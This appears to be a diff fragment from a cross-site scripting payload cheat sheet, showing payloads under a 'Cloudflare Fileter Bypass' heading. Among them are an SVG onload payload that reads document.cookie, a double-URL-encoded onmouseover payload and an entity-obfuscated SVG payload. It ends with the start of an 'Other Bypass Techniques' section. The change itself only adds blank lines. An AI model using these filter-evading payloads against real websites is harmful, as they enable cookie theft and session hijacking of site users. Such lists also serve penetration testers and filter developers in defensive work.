@@ -24,6 +24,13 @@ Cloudflare Fileter Bypass:
 	hello<svg on onload=(alert)(document.cookie)>
 	%2522%2520onmouseover%253D%2522alert%25281%252 - ["onmouseover="alert(1)] double urlencode
 	<svg onload=alert%26%230000000040"1")>
+	
+
+	
+
+	
+
+
 Other Bypass Techniques:
 =======================
 	When [">,alert] is filter/blocked use this:
